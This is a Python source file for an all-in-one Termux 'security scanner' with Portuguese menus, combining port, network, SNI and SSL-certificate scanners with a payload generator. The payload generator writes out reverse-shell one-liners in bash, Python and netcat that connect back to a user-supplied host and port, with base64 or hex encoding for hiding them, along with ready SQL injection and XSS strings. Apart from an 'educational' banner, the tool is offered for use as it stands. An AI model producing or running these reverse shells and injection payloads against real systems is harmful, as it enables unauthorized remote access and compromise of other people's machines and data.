#!/usr/bin/env python3
"""
EDIQUIX TERMUX SCANNER v2.0
Scanner completo para Termux - Tudo em um arquivo!
"""

import socket
import ssl
import threading
import base64
import binascii
import random
import string
import sys
import os
from typing import Dict, List
from datetime import datetime

class Colors:
    """Cores para terminal"""
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    END = '\033[0m'
    BOLD = '\033[1m'

def banner():
    """Exibe banner"""
    print(f"""
{Colors.CYAN}
╔══════════════════════════════════════════╗
║  EDIQUIX TERMUX SCANNER v2.0             ║
║  Multi-Purpose Security Scanner          ║
║  For Educational & Authorized Use Only   ║
╚══════════════════════════════════════════╝
{Colors.END}
    """)

def menu():
    """Menu principal"""
    print(f"\n{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
    print(f"{Colors.BOLD}MENU PRINCIPAL{Colors.END}")
    print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
    print(f"{Colors.GREEN}1.{Colors.END} 📡 Port Scanner")
    print(f"{Colors.GREEN}2.{Colors.END} 🔐 SNI Scanner")
    print(f"{Colors.GREEN}3.{Colors.END} 💣 Payload Generator")
    print(f"{Colors.GREEN}4.{Colors.END} 🌐 Network Scanner")
    print(f"{Colors.GREEN}5.{Colors.END} 🔍 SSL Certificate Checker")
    print(f"{Colors.GREEN}6.{Colors.END} ⚡ Quick Tools")
    print(f"{Colors.GREEN}0.{Colors.END} ❌ Sair")
    print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════{Colors.END}")

# ============== PORT SCANNER ==============
def port_scanner():
    """Escaneia portas abertas"""
    print(f"\n{Colors.BOLD}{Colors.YELLOW}[*] PORT SCANNER{Colors.END}")
    
    host = input(f"{Colors.GREEN}➜{Colors.END} Host/IP: ").strip()
    port_input = input(f"{Colors.GREEN}➜{Colors.END} Porta(s) [ex: 80,443,22 ou 20-1000]: ").strip()
    
    ports = []
    try:
        if '-' in port_input:
            start, end = port_input.split('-')
            ports = list(range(int(start), int(end) + 1))
        else:
            ports = [int(p.strip()) for p in port_input.split(',')]
    except:
        print(f"{Colors.RED}[-] Entrada inválida!{Colors.END}")
        return
    
    threads_num = int(input(f"{Colors.GREEN}➜{Colors.END} Threads [10]: ") or "10")
    
    open_ports = []
    
    def check_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result == 0:
                open_ports.append(port)
                print(f"{Colors.GREEN}[+]{Colors.END} Porta {Colors.YELLOW}{port}{Colors.END} ABERTA")
        except:
            pass
    
    print(f"\n{Colors.BLUE}[*] Escaneando {len(ports)} portas...{Colors.END}\n")
    
    threads = []
    for port in ports:
        while threading.active_count() > threads_num:
            pass
        t = threading.Thread(target=check_port, args=(port,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    print(f"\n{Colors.BOLD}{Colors.GREEN}[+] RESUMO:{Colors.END}")
    print(f"{Colors.GREEN}✓ Portas abertas: {len(open_ports)}{Colors.END}")
    if open_ports:
        print(f"{Colors.YELLOW}Portas: {', '.join(map(str, sorted(open_ports)))}{Colors.END}")

# ============== SNI SCANNER ==============
def sni_scanner():
    """Escaneia SNIs"""
    print(f"\n{Colors.BOLD}{Colors.YELLOW}[*] SNI SCANNER{Colors.END}")
    
    host = input(f"{Colors.GREEN}➜{Colors.END} Host/IP: ").strip()
    port = int(input(f"{Colors.GREEN}➜{Colors.END} Porta [443]: ") or "443")
    sni_input = input(f"{Colors.GREEN}➜{Colors.END} SNIs (separadas por vírgula): ").strip()
    
    sni_list = [s.strip() for s in sni_input.split(',')]
    
    print(f"\n{Colors.BLUE}[*] Testando {len(sni_list)} SNIs...{Colors.END}\n")
    
    for sni in sni_list:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((host, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=sni) as ssock:
                    cert = ssock.getpeercert()
                    version = ssock.version()
                    cipher = ssock.cipher()
                    
                    print(f"{Colors.GREEN}[✓]{Colors.END} SNI: {Colors.YELLOW}{sni}{Colors.END}")
                    print(f"    SSL Version: {Colors.CYAN}{version}{Colors.END}")
                    print(f"    Cipher: {Colors.CYAN}{cipher[0] if cipher else 'Unknown'}{Colors.END}")
                    print()
        except Exception as e:
            print(f"{Colors.RED}[✗]{Colors.END} SNI: {Colors.YELLOW}{sni}{Colors.END} - {Colors.RED}{str(e)[:50]}{Colors.END}\n")

# ============== PAYLOAD GENERATOR ==============
def payload_generator():
    """Gera payloads"""
    print(f"\n{Colors.BOLD}{Colors.YELLOW}[*] PAYLOAD GENERATOR{Colors.END}\n")
    print(f"{Colors.GREEN}1.{Colors.END} Reverse Shell")
    print(f"{Colors.GREEN}2.{Colors.END} SQL Injection")
    print(f"{Colors.GREEN}3.{Colors.END} XSS Payload")
    print(f"{Colors.GREEN}4.{Colors.END} Password List")
    
    choice = input(f"\n{Colors.GREEN}➜{Colors.END} Escolha: ").strip()
    
    if choice == "1":
        lhost = input(f"{Colors.GREEN}➜{Colors.END} LHOST (seu IP): ").strip()
        lport = input(f"{Colors.GREEN}➜{Colors.END} LPORT: ").strip()
        shell_type = input(f"{Colors.GREEN}➜{Colors.END} Tipo [bash/python/nc/perl]: ").strip() or "bash"
        
        shells = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "nc": f"nc -e /bin/sh {lhost} {lport}",
        }
        
        payload = shells.get(shell_type, shells["bash"])
        print(f"\n{Colors.GREEN}[+] Payload:{Colors.END}\n{Colors.CYAN}{payload}{Colors.END}\n")
        
        encode = input(f"{Colors.GREEN}➜{Colors.END} Codificar? (base64/hex/none) [none]: ").strip()
        if encode == "base64":
            encoded = base64.b64encode(payload.encode()).decode()
            print(f"{Colors.GREEN}[+] Base64:{Colors.END}\n{Colors.CYAN}{encoded}{Colors.END}\n")
        elif encode == "hex":
            encoded = binascii.hexlify(payload.encode()).decode()
            print(f"{Colors.GREEN}[+] Hex:{Colors.END}\n{Colors.CYAN}{encoded}{Colors.END}\n")
    
    elif choice == "2":
        sql_payloads = {
            "1": "' UNION SELECT NULL,NULL,NULL,NULL,NULL -- -",
            "2": "' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e)) -- -",
            "3": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- -",
            "4": "' AND '1'='1"
        }
        
        print(f"\n{Colors.GREEN}1.{Colors.END} UNION Based")
        print(f"{Colors.GREEN}2.{Colors.END} Error Based")
        print(f"{Colors.GREEN}3.{Colors.END} Time Based")
        print(f"{Colors.GREEN}4.{Colors.END} Boolean Based")
        
        sql_choice = input(f"\n{Colors.GREEN}➜{Colors.END} Tipo: ").strip() or "1"
        payload = sql_payloads.get(sql_choice, sql_payloads["1"])
        print(f"\n{Colors.GREEN}[+] Payload:{Colors.END}\n{Colors.CYAN}{payload}{Colors.END}\n")
    
    elif choice == "3":
        xss_payloads = {
            "1": "<script>alert('XSS')</script>",
            "2": "<img src=x onerror=alert('XSS')>",
            "3": "<svg onload=alert('XSS')>",
            "4": "<iframe src=javascript:alert('XSS')></iframe>"
        }
        
        print(f"\n{Colors.GREEN}1.{Colors.END} Script Tag")
        print(f"{Colors.GREEN}2.{Colors.END} Event Handler")
        print(f"{Colors.GREEN}3.{Colors.END} SVG")
        print(f"{Colors.GREEN}4.{Colors.END} IFrame")
        
        xss_choice = input(f"\n{Colors.GREEN}➜{Colors.END} Tipo: ").strip() or "1"
        payload = xss_payloads.get(xss_choice, xss_payloads["1"])
        print(f"\n{Colors.GREEN}[+] Payload:{Colors.END}\n{Colors.CYAN}{payload}{Colors.END}\n")
    
    elif choice == "4":
        size = int(input(f"{Colors.GREEN}➜{Colors.END} Quantidade [100]: ") or "100")
        length = int(input(f"{Colors.GREEN}➜{Colors.END} Tamanho [8]: ") or "8")
        
        chars = string.ascii_letters + string.digits + string.punctuation
        passwords = [''.join(random.choice(chars) for _ in range(length)) for _ in range(size)]
        
        print(f"\n{Colors.GREEN}[+] Primeiras 10 senhas:{Colors.END}")
        for pwd in passwords[:10]:
            print(f"  {Colors.CYAN}{pwd}{Colors.END}")
        
        save = input(f"\n{Colors.GREEN}➜{Colors.END} Salvar em arquivo? (s/n): ").strip().lower()
        if save == 's':
            with open("passwords.txt", "w") as f:
                for pwd in passwords:
                    f.write(pwd + "\n")
            print(f"{Colors.GREEN}[+] Salvo em passwords.txt{Colors.END}")

# ============== NETWORK SCANNER ==============
def network_scanner():
    """Escaneia rede"""
    print(f"\n{Colors.BOLD}{Colors.YELLOW}[*] NETWORK SCANNER{Colors.END}")
    
    network = input(f"{Colors.GREEN}➜{Colors.END} Rede CIDR [192.168.1.0/24]: ").strip() or "192.168.1.0/24"
    port = int(input(f"{Colors.GREEN}➜{Colors.END} Porta [22]: ") or "22")
    
    import ipaddress
    
    try:
        net = ipaddress.ip_network(network, strict=False)
    except:
        print(f"{Colors.RED}[-] Rede inválida!{Colors.END}")
        return
    
    found_hosts = []
    
    def check_host(ip):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((str(ip), port))
            sock.close()
            
            if result == 0:
                found_hosts.append(str(ip))
                print(f"{Colors.GREEN}[+]{Colors.END} {Colors.YELLOW}{ip}{Colors.END} - Porta {Colors.YELLOW}{port}{Colors.END} ABERTA")
        except:
            pass
    
    print(f"\n{Colors.BLUE}[*] Escaneando rede {network}...{Colors.END}\n")
    
    threads = []
    for ip in list(net.hosts())[:256]:
        t = threading.Thread(target=check_host, args=(ip,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    print(f"\n{Colors.BOLD}{Colors.GREEN}[+] Hosts encontrados: {len(found_hosts)}{Colors.END}\n")

# ============== SSL CERTIFICATE CHECKER ==============
def ssl_checker():
    """Verifica certificado SSL"""
    print(f"\n{Colors.BOLD}{Colors.YELLOW}[*] SSL CERTIFICATE CHECKER{Colors.END}")
    
    host = input(f"{Colors.GREEN}➜{Colors.END} Host/IP: ").strip()
    port = int(input(f"{Colors.GREEN}➜{Colors.END} Porta [443]: ") or "443")
    
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with socket.create_connection((host, port), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                version = ssock.version()
                cipher = ssock.cipher()
                
                print(f"\n{Colors.GREEN}[+] Informações do Certificado:{Colors.END}")
                print(f"{Colors.CYAN}SSL Version: {version}{Colors.END}")
                print(f"{Colors.CYAN}Cipher: {cipher[0] if cipher else 'Unknown'}{Colors.END}")
                print(f"{Colors.CYAN}Cipher Bits: {cipher[2] if cipher and len(cipher) > 2 else 'Unknown'}{Colors.END}")
                
                if cert:
                    print(f"\n{Colors.GREEN}[+] Subject:{Colors.END}")
                    for key, value in cert.get('subject', {})[-1][0]:
                        print(f"  {Colors.YELLOW}{key}{Colors.END}: {Colors.CYAN}{value}{Colors.END}")
                    
                    print(f"\n{Colors.GREEN}[+] Not Valid After: {Colors.CYAN}{cert.get('notAfter', 'N/A')}{Colors.END}")
    
    except Exception as e:
        print(f"{Colors.RED}[-] Erro: {str(e)}{Colors.END}")

# ============== QUICK TOOLS ==============
def quick_tools():
    """Ferramentas rápidas"""
    print(f"\n{Colors.BOLD}{Colors.YELLOW}[*] QUICK TOOLS{Colors.END}\n")
    print(f"{Colors.GREEN}1.{Colors.END} Encode/Decode Base64")
    print(f"{Colors.GREEN}2.{Colors.END} IP Info")
    print(f"{Colors.GREEN}3.{Colors.END} DNS Lookup")
    print(f"{Colors.GREEN}4.{Colors.END} Check Open Ports (1-1000)")
    
    choice = input(f"\n{Colors.GREEN}➜{Colors.END} Escolha: ").strip()
    
    if choice == "1":
        text = input(f"{Colors.GREEN}➜{Colors.END} Texto: ").strip()
        print(f"\n{Colors.GREEN}[+] Base64 Encode:{Colors.END} {Colors.CYAN}{base64.b64encode(text.encode()).decode()}{Colors.END}")
        print(f"{Colors.GREEN}[+] Base64 Decode:{Colors.END} {Colors.CYAN}{base64.b64decode(text).decode(errors='ignore')}{Colors.END}\n")
    
    elif choice == "2":
        host = input(f"{Colors.GREEN}➜{Colors.END} Host/IP: ").strip()
        try:
            ip = socket.gethostbyname(host)
            print(f"\n{Colors.GREEN}[+] Host: {Colors.CYAN}{host}{Colors.END}")
            print(f"{Colors.GREEN}[+] IP: {Colors.CYAN}{ip}{Colors.END}\n")
        except:
            print(f"{Colors.RED}[-] Não foi possível resolver{Colors.END}\n")
    
    elif choice == "3":
        domain = input(f"{Colors.GREEN}➜{Colors.END} Domínio: ").strip()
        try:
            ip = socket.gethostbyname(domain)
            print(f"\n{Colors.GREEN}[+] DNS Lookup: {domain}{Colors.END}")
            print(f"{Colors.GREEN}[+] IP: {Colors.CYAN}{ip}{Colors.END}\n")
        except:
            print(f"{Colors.RED}[-] Erro na resolução{Colors.END}\n")
    
    elif choice == "4":
        host = input(f"{Colors.GREEN}➜{Colors.END} Host/IP: ").strip()
        print(f"\n{Colors.BLUE}[*] Escaneando portas 1-1000...{Colors.END}\n")
        
        open_ports = []
        for port in range(1, 1001):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((host, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(port)
                    print(f"{Colors.GREEN}[+]{Colors.END} Porta {Colors.YELLOW}{port}{Colors.END} ABERTA")
            except:
                pass
        
        print(f"\n{Colors.GREEN}[+] Total: {len(open_ports)} portas abertas{Colors.END}\n")

# ============== MAIN ==============
def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner()
    
    while True:
        menu()
        choice = input(f"{Colors.GREEN}➜{Colors.END} Escolha: ").strip()
        
        try:
            if choice == "1":
                port_scanner()
            elif choice == "2":
                sni_scanner()
            elif choice == "3":
                payload_generator()
            elif choice == "4":
                network_scanner()
            elif choice == "5":
                ssl_checker()
            elif choice == "6":
                quick_tools()
            elif choice == "0":
                print(f"\n{Colors.GREEN}[*] Até logo! 👋{Colors.END}\n")
                sys.exit(0)
            else:
                print(f"{Colors.RED}[-] Opção inválida!{Colors.END}")
            
            input(f"\n{Colors.YELLOW}Pressione Enter para continuar...{Colors.END}")
            os.system('clear' if os.name == 'posix' else 'cls')
        
        except KeyboardInterrupt:
            print(f"\n\n{Colors.RED}[!] Interrompido pelo usuário{Colors.END}\n")
            sys.exit(0)
        except Exception as e:
            print(f"{Colors.RED}[-] Erro: {str(e)}{Colors.END}")
            input(f"\n{Colors.YELLOW}Pressione Enter para continuar...{Colors.END}")

if __name__ == "__main__":
    main()
